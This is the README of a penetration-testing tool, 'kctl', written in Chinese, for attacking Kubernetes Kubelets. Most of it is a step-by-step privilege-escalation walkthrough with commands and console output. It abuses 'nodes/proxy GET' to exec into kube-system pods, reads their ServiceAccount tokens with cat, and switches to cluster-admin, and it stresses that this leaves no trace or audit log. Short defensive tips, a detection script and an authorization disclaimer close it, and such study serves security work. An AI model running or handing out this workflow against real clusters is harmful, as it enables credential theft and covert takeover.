# kctl

Kubernetes Kubelet Security Audit Tool - 专用于 Kubelet 节点的安全审计与渗透测试

## 功能概览

kctl 是一个轻量级的 Kubernetes 安全审计工具，专门针对 Kubelet API 进行安全评估和权限分析。设计用于渗透测试场景，支持在 Pod 内运行时自动检测环境并进行横向移动。

## 快速开始

### 基本使用

```bash
# 进入交互式控制台
./kctl console

# 指定目标进入
./kctl console -t 10.0.0.1

# 使用代理
./kctl console -t 10.0.0.1 --proxy socks5://127.0.0.1:1080
```

## 交互式控制台

进入控制台后会自动：
1. 检测 Kubelet IP（默认网关）
2. 读取 ServiceAccount Token
3. 连接到 Kubelet
4. 检查当前 SA 的权限

```
$ ./kctl console

    ██╗  ██╗ ██████╗████████╗██╗
    ██║ ██╔╝██╔════╝╚══██╔══╝██║
    █████╔╝ ██║        ██║   ██║
    ██╔═██╗ ██║        ██║   ██║
    ██║  ██╗╚██████╗   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
                Kubelet Security Audit Tool

  Mode        : In-Pod (Memory Database)
  Kubelet     : 10.244.1.1:10250 (auto-detected)
  Token       : /var/run/secrets/kubernetes.io/serviceaccount/token

[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: CRITICAL

kctl [default/attacker CRITICAL]>
```

### 控制台命令

| 命令 | 说明 |
|------|------|
| `help` | 显示帮助信息 |
| `connect` | 连接到 Kubelet |
| `scan` | 扫描所有 Pod 的 SA 权限 |
| `sa` | 列出已扫描的 ServiceAccount |
| `pods` | 列出节点上的 Pod |
| `use <ns/name>` | 切换到指定的 ServiceAccount |
| `info` | 显示当前 SA 的详细信息 |
| `exec` | 在 Pod 中执行命令 |
| `set <key> <value>` | 设置配置项 |
| `show options` | 显示当前配置 |
| `show status` | 显示会话状态 |
| `export json/csv` | 导出扫描结果 |
| `clear` | 清除缓存 |
| `exit` | 退出控制台 |

### 典型工作流程

```bash
# 1. 进入控制台（自动连接并检查当前 SA 权限）
kctl [default/attacker CRITICAL]> info

# 2. 扫描节点上所有 Pod 的 SA 权限
kctl [default/attacker CRITICAL]> scan

# 3. 查看高权限 SA
kctl [default/attacker CRITICAL]> sa --admin

# 4. 切换到高权限 SA
kctl [default/attacker CRITICAL]> use kube-system/cluster-admin

# 5. 查看新身份的权限
kctl [kube-system/cluster-admin ADMIN]> info

# 6. 使用新身份执行命令
kctl [kube-system/cluster-admin ADMIN]> exec -it
```

## 实战案例：nodes/proxy 权限提权

### 背景

`nodes/proxy GET` 权限是一个常见但危险的权限，许多监控工具（如 Prometheus、Datadog、Grafana）都需要此权限来收集指标。

根据 [Graham Helton 的研究](https://grahamhelton.com/blog/nodes-proxy-rce)，由于 Kubelet 在处理 WebSocket 连接时的授权缺陷，`nodes/proxy GET` 权限实际上可以用于在任意 Pod 中执行命令。

### 漏洞原理

1. WebSocket 协议要求使用 HTTP GET 进行初始握手
2. Kubelet 基于初始 HTTP 方法（GET）进行授权检查
3. 授权通过后，WebSocket 连接可以访问 `/exec` 端点执行命令
4. 这绕过了本应需要的 `nodes/proxy CREATE` 权限

### 使用 kctl 进行提权

#### 场景设置

假设你已经获得了一个 Pod 的访问权限，该 Pod 的 ServiceAccount 具有 `nodes/proxy GET` 权限：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: nodes-proxy-reader
rules:
  - apiGroups: [""]
    resources: ["nodes/proxy"]
    verbs: ["get"]
```

#### 步骤 1：进入控制台并检查权限

```bash
# 将 kctl 复制到目标 Pod
kubectl cp kctl-linux-amd64 attacker:/kctl

# 进入 Pod
kubectl exec -it attacker -- /bin/sh

# 运行 kctl
/kctl console
```

```
[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: HIGH

kctl [default/attacker HIGH]>
```

#### 步骤 2：查看当前权限

```
kctl [default/attacker HIGH]> info

  ServiceAccount Information
  ─────────────────────────────────────────
  Name            : attacker
  Namespace       : default
  Risk Level      : HIGH
  Token Status    : Valid

  Permissions:
    - nodes/proxy:get        <- 关键权限！
    - nodes:list
    - pods:list
```

#### 步骤 3：扫描节点上的所有 Pod

```
kctl [default/attacker HIGH]> scan

[*] Scanning ServiceAccount tokens...
[*] Found 15 pods with SA tokens
[*] Checking permissions... (3 concurrent)

RISK     NAMESPACE      POD                    SERVICE ACCOUNT      TOKEN    FLAGS
─────────────────────────────────────────────────────────────────────────────────
ADMIN    kube-system    kube-proxy-xxxxx       kube-proxy           Valid    -
ADMIN    kube-system    coredns-xxxxx          coredns              Valid    -
HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
...

[+] Scan complete: 15 SAs, 2 ADMIN, 1 CRITICAL, 3 HIGH
```

#### 步骤 4：利用 nodes/proxy 执行命令

由于我们有 `nodes/proxy GET` 权限，可以直接通过 Kubelet API 在任意 Pod 中执行命令：

```
kctl [default/attacker HIGH]> pods

NAMESPACE      POD                         STATUS    CONTAINERS
───────────────────────────────────────────────────────────────
kube-system    etcd-master                 Running   etcd
kube-system    kube-apiserver-master       Running   kube-apiserver
kube-system    kube-proxy-xxxxx            Running   kube-proxy
default        nginx                       Running   nginx
...
```

```
kctl [default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

这会返回 `kube-proxy` 的 ServiceAccount Token，该 Token 通常具有 cluster-admin 权限！

#### 步骤 5：切换到高权限身份

```
kctl [default/attacker HIGH]> use kube-system/kube-proxy

[+] Switched to kube-system/kube-proxy
[*] Checking permissions...
[!] Risk Level: ADMIN (cluster-admin)

kctl [kube-system/kube-proxy ADMIN]>
```

#### 步骤 6：完全控制集群

现在你拥有了 cluster-admin 权限，可以使用该 token 对集群进行完全控制。

### 攻击流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                    nodes/proxy GET 提权流程                      │
└─────────────────────────────────────────────────────────────────┘

┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│  初始访问     │     │  权限发现     │     │  横向移动            │
│              │     │              │     │                      │
│ 获得 Pod     │────>│ 发现有       │────>│ 通过 Kubelet API     │
│ 访问权限     │     │ nodes/proxy  │     │ 在其他 Pod 执行命令   │
│              │     │ GET 权限     │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
                                                    │
                                                    v
┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│  完全控制     │     │  权限提升     │     │  Token 窃取          │
│              │     │              │     │                      │
│ cluster-admin│<────│ 使用高权限   │<────│ 读取系统 Pod 的      │
│ 权限         │     │ SA Token     │     │ SA Token             │
│              │     │              │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
```

### 防御建议

1. **避免授予 nodes/proxy 权限** - 使用 KEP-2862 提供的细粒度权限（如 `nodes/metrics`、`nodes/stats`）
2. **网络隔离** - 限制对 Kubelet 端口（10250）的访问
3. **审计日志** - 注意：直接访问 Kubelet API 不会生成 pods/exec 审计日志
4. **最小权限原则** - 定期审查 ServiceAccount 权限

### 检测脚本

检查集群中是否存在具有 `nodes/proxy` 权限的 ServiceAccount：

```bash
# 检查所有 ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | 
  select(.roleRef.kind == "ClusterRole") |
  .metadata.name as $binding |
  .roleRef.name as $role |
  .subjects[]? |
  "\($binding) -> \($role) -> \(.kind)/\(.namespace)/\(.name)"
' | while read line; do
  role=$(echo $line | cut -d'>' -f2 | tr -d ' ')
  kubectl get clusterrole $role -o json 2>/dev/null | \
    jq -e '.rules[] | select(.resources[] | contains("nodes/proxy"))' >/dev/null && \
    echo "[!] $line"
done
```

## 命令行参数

```
Usage:
  kctl console [flags]

Flags:
  -t, --target string       Kubelet IP 地址
  -p, --port int            Kubelet 端口 (default 10250)
      --token string        Token 字符串
      --token-file string   Token 文件路径
      --proxy string        SOCKS5 代理地址
  -h, --help                help for console

Global Flags:
      --logLevel string     日志等级 (default "info")
```

## 风险等级说明

| 等级 | 说明 | 示例权限 |
|------|------|----------|
| ADMIN | 集群管理员 | `*/*`、cluster-admin |
| CRITICAL | 可直接提权 | `secrets:create`、`pods/exec:create` |
| HIGH | 可泄露敏感信息 | `secrets:get`、`nodes/proxy:get` |
| MEDIUM | 可能被滥用 | `pods:create`、`configmaps:get` |
| LOW | 低风险 | `pods:list`、`services:get` |
| NONE | 无风险 | 只读基础权限 |

## 注意事项

- 本工具仅用于合法的安全评估和渗透测试
- 使用前请确保已获得适当的授权
- 所有操作都在内存中进行，退出后不留痕迹
- 直接访问 Kubelet API 的操作不会被 Kubernetes 审计日志记录

## 参考资料

- [Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)

## 许可证

MIT License
